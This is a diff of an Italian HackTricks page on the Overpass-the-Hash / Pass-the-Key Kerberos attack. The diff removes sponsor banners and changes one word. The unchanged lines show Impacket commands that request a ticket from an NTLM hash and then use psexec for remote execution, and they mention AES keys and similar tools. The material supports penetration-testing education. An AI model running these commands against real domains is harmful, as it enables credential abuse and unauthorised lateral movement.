@@ -2,9 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 ## Overpass The Hash/Pass The Key (PTK)
 
@@ -18,7 +15,7 @@ python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-Per scenari che richiedono AES256, l'opzione `-aesKey [AES key]` può essere utilizzata. Inoltre, il ticket acquisito può essere impiegato con vari strumenti, inclusi smbexec.py o wmiexec.py, ampliando l'ambito dell'attacco.
+Per scenari che richiedono AES256, l'opzione `-aesKey [AES key]` può essere utilizzata. Inoltre, il ticket acquisito potrebbe essere impiegato con vari strumenti, inclusi smbexec.py o wmiexec.py, ampliando l'ambito dell'attacco.
 
 Problemi riscontrati come _PyAsn1Error_ o _KDC cannot find the name_ sono tipicamente risolti aggiornando la libreria Impacket o utilizzando il nome host invece dell'indirizzo IP, garantendo la compatibilità con il KDC di Kerberos.
 
@@ -37,8 +34,5 @@ Per conformarsi alla sicurezza operativa e utilizzare AES256, può essere applic
 
 - [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
